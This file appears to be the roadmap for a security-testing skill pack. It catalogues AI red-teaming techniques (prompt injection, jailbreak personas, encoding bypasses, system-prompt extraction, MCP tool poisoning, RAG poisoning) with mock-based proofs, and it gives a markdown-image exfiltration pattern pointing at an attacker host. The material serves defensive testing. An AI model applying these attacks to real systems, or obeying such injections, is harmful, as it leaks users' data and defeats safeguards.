# ROADMAP.md — expansion batches toward god level

**Batch A (this repo state) produced `AUDIT.md`; this file sequences the rest.**
Doctrine unchanged from the pack's founding rules: research the mature public
source first → COPY its concrete technique → NORMALIZE into the strict `Skill`
schema → PROVE with G3 mocks (vulnerable mock passes, benign control fails) →
CONTROL (negative-control honesty) → FILE one vulnerability per folder. No
generalization; no skill that cannot be falsified.

Cross-reference: every batch below is tied to the executor agents it requires
(`AUDIT.md` §3). A batch without its agent lands as design + find-only skills
and says so; it does not fake provability.

---

## B — AI red teaming (P0 · the user's stated priority · 6 shelves ≈ 30 skills)

> **STATUS: DELIVERED 2026-11-07 (Batch b).** 30 skills across
> `ai_prompt_injection` (6) · `ai_system_prompt_exfil` (4) · `ai_jailbreak` (5)
> · `ai_agentic_tools` (7) · `ai_rag_vector` (4) · `ai_output_handling` (4),
> all passing G1–G3 with `llm_mock` fixtures (AUTHORING §2.5), plus the
> `ai_agent_hijack` chain group (4 chains, C1–C4 green; pack now 28 chains /
> 8 groups / 93 distinct skills chained). Exit criteria met: benign mocks
> (stubborn model) added for every skill; `llm_harness` agent spec = AUDIT §3 #1.

### B.0 What exists to copy (researched 2026-11-07)

| Source | What it contributes |
|---|---|
| OWASP GenAI **LLM Top 10 2025** (genai.owasp.org/llm-top-10) | the ten risk families: LLM01 prompt injection, LLM02 sensitive info disclosure, LLM03 supply chain, LLM04 data/model poisoning, LLM05 improper output handling, LLM06 excessive agency, LLM07 system prompt leakage, LLM08 vector/embedding weaknesses, LLM09 misinformation, LLM10 unbounded consumption |
| OWASP **Agentic Top 10 2026** (ASI01–ASI10, published 2025-12-09) | agent-action risks: ASI01 agent goal hijack, ASI02 tool misuse & exploitation, ASI03 agent identity & privilege abuse, ASI04 agentic supply chain, ASI05 insecure code execution, ASI06 memory poisoning, ASI07 insecure inter-agent communication, ASI08 cascading failures, ASI09 human-agent trust exploitation, ASI10 rogue agents |
| **NVIDIA/garak** (LGPL) | probe taxonomy to rewrite: `promptinject`, `dan.Dan_11_0` / `dan.DanInTheWild`, `encoding`, `leakreplay`, `packagehallucination`, `glitch`, `knownbadsignatures`, `xss`, `lmrc` |
| **microsoft/PyRIT** | component model we mirror: orchestrators / targets / converters / scorers / memory; 53+ adversarial datasets, 70+ converters, multi-turn attack strategies |
| **promptfoo red-team plugins** | plugin-level test classes: prompt-extraction, rag-poisoning, ssrf-via-model, excessive-agency, cross-session-leak, hallucination/overreliance, harmful-content families |
| Simon Willison, **the lethal trifecta** (2025-06-16) | the exfiltration doctrine: private data + untrusted content + external communication = stealable; every exfil skill is designed as a trifecta demonstration |
| **MCP security research** (tool poisoning, rug pull — Invariant Labs et al., 2025) | adversarial instructions in tool descriptions/schemas; silent post-approval tool mutation; MCP-specific shelf items |
| OWASP GenAI **Red Teaming Manual v1.0** (2026-10) | campaign structure for AI engagements |

### B.1 Shelf designs (one vulnerability per folder, as always)

**`categories/ai_prompt_injection/` — LLM01 + ASI01 (6 skills)**
| Skill (slug) | Technique (copied from) | Proof via `llm_mock` |
|---|---|---|
| `direct_instruction_override` | ignore-previous-directives class (garak promptinject, OWASP LLM01) | mock rule-table: injected imperative flips canned verdict → `json_differs` on decision field |
| `delimiter_segment_confusion` | system/user boundary confusion via delimiters (promptinject variants) | mock honors delimiter rule → verdict flip |
| `indirect_injection_untrusted_content` | instructions hidden in retrieved/summarized content — the lethal-trifecta core (Willison 2025) | mock "retrieves" seeded doc containing directive → tool-call emitted |
| `crescendo_multiturn_escalation` | multi-turn gradual escalation (PyRIT attack-strategy class) | turn-3 payload triggers rule the turn-1 payload did not |
| `tool_call_hijack_via_injection` | injected directive causes tool invocation with attacker args (ASI01/ASI02) | mock emits `{"tool": "...", "args": {...}}` → args contain canary |
| `payload_splitting_assembly` | payload split across turns/messages and assembled in context (encoding/converter class) | assembled canary appears in output |

**`categories/ai_system_prompt_exfil/` — LLM07 + LLM02 (4 skills)**
| Skill | Technique | Proof |
|---|---|---|
| `system_prompt_direct_extraction` | prompt-extraction plugin class (promptfoo; garak leakreplay) | mock leaks seeded canary system prompt → `body_regex` on canary |
| `markdown_image_exfil_channel` | ![](https://attacker/{{secret}}) exfil via renderer (documented in exfil-attack literature; trifecta external-communication leg) | mock emits canary-host image URL → `body_regex` |
| `rag_document_exfil_indirect` | planted document instructs model to echo context (LLM07×LLM08 combo) | canary from seeded corpus appears in answer |
| `cross_session_leakage` | cross-session-leak plugin class (promptfoo) | session-B output contains session-A seeded canary |

**`categories/ai_jailbreak/` — safety-boundary bypass (5 skills)**
| Skill | Technique | Proof |
|---|---|---|
| `roleplay_persona_pair` | DAN/STAN lineage (garak `dan` probes) | mock refuses benign, complies under persona → verdict flip on seeded topic |
| `encoding_obfuscation_bypass` | base64/rot13 wrapper (garak `encoding`) | decoded payload matches rule → compliance |
| `refusal_suppression_ladder` | "do not refuse / no warnings" ladder (converter class) | refusal token absent on escalated prompt |
| `knownbadsignatures_trigger` | known bad signature strings (garak `knownbadsignatures`, `grandma` style) | canned trigger → canned compliance |
| `payload_compression_tokensmuggle` | token smuggling / compression (published token-smuggling technique) | decoded canary in output |

**`categories/ai_agentic_tools/` — ASI01–ASI03, ASI06, ASI07, ASI10, LLM06, MCP (7 skills)**
| Skill | Technique | Proof |
|---|---|---|
| `mcp_tool_poisoning_description` | adversarial instructions inside tool description (Invariant Labs MCP tool-poisoning, 2025) | mock agent reads tool metadata → follows embedded directive → canary tool-call |
| `mcp_rug_pull_hash_delta` | tool mutates after approval (MCP rug-pull research) | first fetch vs second fetch hash delta on same tool name |
| `excessive_agency_irreversible_action` | agent performs destructive/irreversible op without confirmation (LLM06; ASI02) | mock emits delete/transfer call with no confirm flag |
| `memory_poisoning_persistence` | poisoned memory entry steers later sessions (ASI06) | session-2 output references planted memory canary |
| `inter_agent_message_injection` | injected directive via agent-to-agent channel (ASI07) | downstream agent acts on injected directive |
| `goal_hijack_untrusted_content` | agent goal replaced by attacker content mid-task (ASI01; trifecta) | plan/step list diverges to attacker objective |
| `rogue_subagent_spawn` | agent spawns unauthorized sub-agent/tool loop (ASI10) | mock emits spawn call absent from benign trace |

**`categories/ai_rag_vector/` — LLM08 + LLM04 (4 skills)**
| Skill | Technique | Proof |
|---|---|---|
| `rag_document_poisoning` | planted doc dominates retrieval (promptfoo rag-poisoning; OWASP LLM08) | poisoned canary in retrieved answer |
| `cross_context_retrieval_bleed` | tenant-A query retrieves tenant-B chunk (vector-store scoping flaw) | other-tenant canary in answer |
| `embedding_semantic_collision` | semantic collision pulls unrelated sensitive chunk (embedding weakness class) | retrieval of seeded off-topic secret on crafted query |
| `corpus_confusion_index_mismatch` | index/doc mismatch serves stale/other source (LLM08) | mismatched-source marker in answer |

**`categories/ai_output_handling/` — LLM05 + LLM10 (4 skills)**
| Skill | Technique | Proof |
|---|---|---|
| `llm_output_markdown_xss` | unrendered model output → script sink in web UI (LLM05; garak `xss` probe) | mock output contains marker payload; conditions identical to web/xss |
| `llm_generated_code_execution` | app executes model-suggested code/shell (LLM05) | mock emits `os`/`eval` marker → sink regex |
| `model_suggested_url_ssrf` | model output feeds URL fetcher (promptfoo ssrf plugin class; LLM05) | fetcher called with attacker host (mock log) |
| `token_burn_amplification` | nested/alias calls multiply consumption (LLM10 unbounded consumption) | mock invocation count ≥ threshold on single request |

### B.2 Proof strategy — `llm_mock` (keeps G3 honest)

Extend `mocks.json` with a **deterministic rule-table fake LLM**: named fixture,
input regex/predicate → canned output (verdict flip, tool-call emission, canary
leak). Then every existing condition verb (`body_regex`, `json_differs`,
`reflected_unescaped`, `latency_delta`) works unchanged, and the benign control
(stubborn mock that ignores injection) still fails ≥1 condition — the pack's
falsifiability doctrine survives into the AI domain **without pretending to run
a real model**. Live-model nondeterminism is declared out of scope for G3 and
belongs to the future live-harness flag on agent #1 (same way OOB confirmation
is declared honest-gap today).

### B.3 New chain group `ai_agent_hijack/` (4 chains)

| Chain | Path |
|---|---|
| `injection-to-tool-abuse` | indirect injection (untrusted content) → goal hijack → tool-call hijack → exfil via markdown image |
| `mcp-poisoning-to-hijack` | tool poisoning → rug-pull hash delta → rogue sub-agent → excessive-agency irreversible action |
| `rag-poison-to-exfil` | document poisoning → cross-context bleed → system-prompt extraction → cross-session leak |
| `jailbreak-to-client-xss` | encoding bypass → refusal suppression → output markdown XSS (bridges to `web/xss` shelf) |

### B.4 Batch B exit criteria
30 skills pass G1–G3 with `llm_mock` fixtures; 4 chains pass C1–C4; new benign
mocks (stubborn/correct LLM) added ≥2 per shelf; `llm_harness` agent spec
written into `AUDIT.md` §3 (no silent find-only additions).

---

## B-engine — Phase B1 / Phase B2 (`redteam/llmred` dynamics, P0 · engine track)

> **STATUS: B1 DELIVERED 2026-11-07 (commit `586006a`); B2 DELIVERED 2026-11-08.**
> The engine phases run alongside the pack batches (C–G below) and do not add
> pack skills — the zero-duplication discipline applies to the engine too.

**Phase B1 — agentic target adapter.** Verdicts measure what an agent DID:
`AgenticLoopTarget` wraps a real tool-calling loop (the caller's harness IS
the agent under test) and records every actual invocation; `ToolCondition` is
a first-class condition; an invocation outranks any reply text — including a
refusal fired alongside the call; a compliance token without the matching
call is UNDETERMINED. `OpenAIToolLoop` drives OpenAI-compatible brains with
the deployment's real declared tool schema.

**Phase B2 — the dynamics layer: formal adversary models as measuring
instruments** (`dynamics.py`, `propagation.py`; research dossier with the
verified anchor table: `docs/dynamics-research.md`). Research was run as a
system — query batteries across four disciplines, every anchor resolved
before citation, every model needing model→instrument→acceptance-criterion
or dropped:

| Discipline | Instrument | What it measures |
|---|---|---|
| game theory (Stackelberg) | `policy_commitment` | pure vs mixed defender policy: unanimity + verdict entropy over repeated identical probes in fresh sessions |
| game theory (cheap talk) | `signaling_gap` | talk-action divergence: claims are costless talk, recorded invocations are costly signals; divergence is evidence, not intent |
| information theory | `exfil_capacity` | recoverable BITS of a planted secret (full/encoded/prorated-partial), control-first so stateful targets keep the benign control interpretable |
| physics | `timing_contrast` | paired guard-relevant/benign latency contrast with rank-sum significance and a split-half null that discredits drift |
| pharmacology | `dose_response` | threshold kinetics of conversation-level assembly: dose curve, crossing turn, per-message-filter defeat demonstrated |
| economics | `amplification_ratio` | denial-of-wallet proxies from real traffic: byte amplification, recorded tool invocations per attacker message |
| biology/chemistry | `propagation_chain` | Morris II seam made measurable: per-hop text/action survival, attenuation r-factor, inert/contained/propagated/truncated |

Contracts kept: measurements with declared limits, never laundered verdicts;
skips are loud; failures are error blocks, not defenses; one shared
fail-closed budget. The proof loop caught and fixed a real B1 bug during B2
(canary minting produced the constant `CNR-000000000000` —
`uuid.UUID(int=…).hex[:12]` always reads the UUID's zero high bits;
now `getrandbits(48)` hex, seed reproducibility preserved). CLI: `--dynamics`
appends the instruments run + a dynamics card to the campaign report; agentic
targets run dynamics in code via `run_dynamics(target=...)`. Suite: 824 tests
green (792 pre-B2 + 32 dynamics proofs).

---

## C — API deepening (P1 · ~12 skills · prereq: identity/credential agent #7)

Targets OWASP **API Security Top 10 2023** gaps (current APIT 0.50):
API2 broken authentication (token-in-response, weak JWT acceptance on API plane,
auth-matrix differential), API6 unrestricted sensitive business flows (bulk
endpoint abuse differential), API9 improper inventory (old-version endpoint
still live, shadow endpoints via OpenAPI diff — reuses `openapi_spec` skill as
discovery), API10 unsafe consumption of APIs (webhook callback SSRF — pairs with
OOB agent #2), pagination/amplification abuse (elite). Sources: OWASP API Top
10 2023 pages; existing graphql shelf becomes discovery feed.

## D — Network & infrastructure (P1 · ~14 skills · prereq: raw-TCP agent #6 + recon orchestrator #8)

New prefix `net/`: unauth redis (INFO/CONFIG), mongo `isMaster`, memcached
stats, FTP anonymous, SNMP public, SSH banner→CVE routing, SMB guest session,
LDAP anonymous bind, RDP/NTLM banner, proxy/mailservice banner inventory. Proof
strategy: TCP protocol mocks (same G3 pattern — speak bytes, assert response
predicate). Sources: MITRE ATT&CK Discovery/Remote Services tactics, mature
recon tooling docs. This batch also feeds the A06 fingerprint→CVE routing layer
(P1 blocker #4 in AUDIT §4).

## E — Mobile & iOS (P2 · ~12 skills · prereq: mobile kit agent #10)

New prefix `mob/`, static-analysis-first so G3 stays honest via artifact mocks:
Android manifest (debuggable, backup, exported components), cleartext
`networkSecurityConfig`, WebView JS bridges, hardcoded secrets via artifact
scan; iOS Info.plist ATS exceptions, keychain-usage flags, URL-scheme exposure.
Dynamic (frida-based) items land only when agent #10 exists. Sources: OWASP
MASTG test families mapped to MASVS-PLATFORM/NETWORK/STORAGE/CRYPT.

## F — EDR / defense evasion (P2 · ~10 technique cards · prereq: detonation sandbox agent #11)

Attacker-side telemetry validation, not implants: benign-vs-technique detonation
pairs (process injection simulator vs benign compiled stub, script
obfuscation pair, persistence-registration pair) where proof = telemetry delta
observed in sandbox. Closes A09 honestly at the same time (AUDIT P2 #7).
Sources: MITRE ATT&CK TA0005/TA0004 technique pages. **Never shipped without the
sandbox** — this is the one batch where shipping early would be dishonest.

## G — Red team operations (P2 · ~8 skills · recon-heavy, bounded)

`ops/` prefix: SPF/DMARC/DKIM posture for phishing-infra readiness, lookalike
domain registration checks (passive DNS), MFA-fatigue *policy* review checks
(config differential only), staging/VPN exposure sweep (pairs with devops_infra
shelf), extern-collab surface inventory. Scope honesty: campaign-operate
techniques beyond recon/exposure checks are out of pack scope.

## H — Platform hardening (P0 items interleaved with every batch)

1. Upstream PRs for the two `SkillLibrary` bugs (dedup asymmetry, forced uuid4).
2. Evidence/findings export schema (finding record leaving the platform).
3. Fingerprint→CVE routing layer (agent #8 feed; upgrades A06 0.75→0.90).
4. Regression benign corpus ≥2× current size.
5. CI runner contract: scheduled `validate_skill_pack.py` + `validate_chains.py`
   + re-scan cadence (garak-style CI discipline).

## Sequencing

| Batch | Depends on | Size | Moves |
|---|---|---|---|
| **B — AI red teaming** | LLM harness agent spec (can start immediately: shelves + `llm_mock` land first) | 6 shelves / ~30 skills / 4 chains | Cover 1→2.5, and the user's #1 priority |
| C — API | identity agent (#7), OOB (#2) | ~12 skills | APIT 0.50→0.75 |
| D — Network | TCP agent (#6), recon (#8) | ~14 skills | first non-web domain |
| E — Mobile/iOS | mobile kit (#10) | ~12 skills | second/third non-web domain |
| F — EDR | sandbox (#11) | ~10 cards | A09 + Cover row |
| G — Ops | — | ~8 skills | Cover row |
| H — Platform | — | cross-cutting | Operate 1→4 |

Batch B is ready to execute on the next "batch" command with no further
research phase.
